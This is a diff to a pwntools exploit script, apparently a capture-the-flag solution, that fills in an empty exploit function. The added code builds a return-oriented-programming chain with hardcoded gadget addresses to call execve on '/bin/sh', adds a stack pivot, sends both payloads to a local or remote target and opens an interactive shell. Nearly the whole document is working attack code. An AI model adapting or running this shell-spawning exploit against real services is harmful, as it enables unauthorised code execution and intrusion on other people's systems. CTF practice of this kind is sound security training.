@@ -12,13 +12,12 @@ gdbscript = '''
 continue
 '''.format(**locals())
 
-
 ######################################
 ######## Establish Connection ########
 ######################################
 
 def connect_binary():
-    global P, E, GADGET
+    global P, E
     
     with context.local(log_level='error'):
         if args.REMOTE:
@@ -29,14 +28,30 @@ def connect_binary():
             P = process(f"{__file__.replace('_sol.py', '')}")
 
     E = ELF(f"{__file__.replace('_sol.py', '')}")
-    GADGET = lambda x: p64(next(E.search(asm(x, os='linux', arch=E.arch))))
 
 ######################################
 ############## Exploit ###############
 ######################################
 
 def exploit():
-    ### Write exploit here...
+    pause()
+    offset = 8 # cyclic(420) # cyclic(512) - cannot be exactly the size of input read by fgets # this is the size of "/bin/sh;"
+
+    payload = b'/bin/sh;'
+    payload += p64(0x00401162) # pop rdi
+    payload += p64(0x00402004) # p64(leak) # &/bin/sh string
+
+    payload += p64(0x0040115a) # mov rax, 0x3b; ret;
+
+    payload += p64(0x00401164) # pop rsi; pop rdx; ret;
+    payload += p64(0x0)
+    payload += p64(0x0)
+    payload += p64(0x00401167) # syscall;
+
+    pivot = b'A' * 16 + p64(0x0040124c) # add rsp, 8; ret;
+
+    P.sendline(payload)
+    P.sendline(pivot)
     P.interactive()
 
 if __name__ == '__main__':
